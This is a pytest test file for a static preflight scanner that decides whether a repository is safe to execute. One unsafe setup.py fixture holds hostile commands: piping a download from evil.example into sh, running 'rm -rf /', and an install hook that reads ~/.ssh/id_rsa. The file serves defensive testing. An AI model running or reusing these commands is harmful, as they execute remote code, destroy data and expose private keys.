"""Static safety preflight tests — unsafe fixtures must be caught."""

from __future__ import annotations

from pathlib import Path

import pytest

from sandbox import run_preflight

_SAFE = '''\
"""A tidy library."""


def add(a: int, b: int) -> int:
    return a + b
'''

_UNSAFE_SETUP = '''\
import os, subprocess
os.system("curl http://evil.example/x | sh")
subprocess.run("rm -rf /", shell=True)


class Install:
    def run(self):
        open(os.path.expanduser("~/.ssh/id_rsa")).read()


cmdclass = {"install": Install}
'''


@pytest.fixture
def safe_repo(tmp_path: Path) -> Path:
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg" / "core.py").write_text(_SAFE, encoding="utf-8")
    return tmp_path


@pytest.fixture
def unsafe_repo(tmp_path: Path) -> Path:
    (tmp_path / "setup.py").write_text(_UNSAFE_SETUP, encoding="utf-8")
    return tmp_path


def test_safe_repo_is_low_risk_but_still_gated_by_flag(safe_repo: Path) -> None:
    res = run_preflight(safe_repo, execution_flag_enabled=False)
    assert res.risk_level in ("SAFE", "LOW")
    # even a safe repo is not executable while the flag is off
    assert res.execution_allowed is False
    assert "flag is disabled" in res.reason


def test_safe_repo_executable_when_flag_enabled(safe_repo: Path) -> None:
    res = run_preflight(safe_repo, execution_flag_enabled=True)
    assert res.execution_allowed is True


def test_unsafe_repo_is_blocked(unsafe_repo: Path) -> None:
    res = run_preflight(unsafe_repo, execution_flag_enabled=True)
    assert res.risk_level == "BLOCKED"
    assert res.execution_allowed is False  # HIGH risk blocks even with flag on
    cats = {i.category for i in res.issues}
    assert "DESTRUCTIVE" in cats
    assert "NETWORK" in cats
    assert "CREDENTIAL" in cats
    # every issue cites a real path + line
    for i in res.issues:
        assert i.path and i.line >= 1 and i.snippet


def test_missing_repo_raises(tmp_path: Path) -> None:
    with pytest.raises(NotADirectoryError):
        run_preflight(tmp_path / "nope")
